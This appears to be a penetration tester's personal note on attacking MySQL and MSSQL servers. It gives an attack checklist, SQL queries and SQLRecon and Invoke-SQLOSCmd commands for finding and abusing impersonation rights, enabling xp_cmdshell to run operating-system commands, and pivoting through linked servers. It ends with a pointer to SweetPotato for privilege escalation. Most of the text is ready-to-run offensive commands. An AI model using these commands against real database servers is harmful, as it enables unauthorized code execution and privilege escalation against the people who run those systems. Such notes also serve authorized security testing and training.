>[!note]
>This document does NOT cover SQLi attacks or anything related to them, nor does it cover SQL syntax. For SQLi help reference [[SQLi]]. 

TCP//3306 (MySQL)
TCP//1433 (MSSQL)

# SQL Database Checklist
- Enumerate version information
- Exploit if vulnerable
- Determine credentials
	- Bruteforce if no other recourse
- Enumerate valuable information

# MySQL
[[MySQL]]

# MSSQL
[[Sqsh/Sqlcmd]]
[[Impacket]]
[[SQLRecon]]

## MSSQL Impersonation
Impersonation in an MSSQL database is a permission granted to a user or users that allows them to assume the permissions of another user. This perm is explicitly granted and it can be searched for using this query:
```sql
-- Find all principal IDs with impersonate privs
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- Find all principal names associated with IDs
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

[[SQLRecon]] will also do this for you. 

```powershell
SQLRecon.exe /a:wintoken /h:<sql server> /m:impersonate # Idenitfy users who can be impersonated or can impersonate

SQLRecon.exe /a:wintoken /h:<sql-server> /m:iwhoami /i:<acct to impersonate> # Use the i+ command to run whoami as another user acct
```

## Command Execution
[[Invoke-SQLOSCmd]]

MSSQL's xp_cmdshell procedure can give us RCE on the underlying infrastructure. 
```powershell
Invoke-SQLOSCmd -Instance "<sql server connection string>" -Command "whoami" -RawResults # Run a whoami with xp_cmdshell
```

```sql
-- Determine if xp_cmdshell is available
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Reconfigure the instance to allow xp_cmdshell (requires privileges)
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Use xp_cmdshell to execute a simple whoami
EXEC xp_cmdshell 'whoami';
```

>[!note] 
>[[Invoke-SQLOSCmd]] already uses this enabling feature where possible. However, it also disables it again after enabling to ensure minimal impact to the system. We should be careful to do the same when interacting with the system raw. 

```powershell
SQLRecon.exe /a:wintoken /h:<sql server> /m:ienablexp /i:<user acct to impersonate> # Impersonate a privileged user to enable xp_cmdshell

SQLRecon.exe /a:wintoken /h:<sql server> /m:ixpcmd /i:<acct to impersonate> /c:ipconfig # Run an ipconfig on an MSSQL server
```

## Linked Servers
```sql
-- Identify any linked servers
SELECT srvname, srvproduct, rpcout FROM master..sysservers;

-- Query a linked server (careful with precise quotation marks!)
SELECT * FROM OPENQUERY("<linked server>", 'select @@servername');
```

```powershell
SQLRecon.exe /a:wintoken /h:<sql server> /m:links # Identify linked servers

SQLRecon.exe /a:wintoken /h:<sql server> /m:lquery /l:<sql server> /c:"select @@servername" # Query a linked server
```

We cannot remotely reconfigure servers with openquery. On the off chance RPC Out is enabled, you can use MSSQL's AT syntax to reconfigure the remote server. 

If sysadmin privileges are configured on the remote server, you do not need to acquire those privileges from your local server first, it is possible to be an sa user on one server but not another simultaneously. 

Use [[SweetPotato]] for privilege escalation via MSSQL privs. 
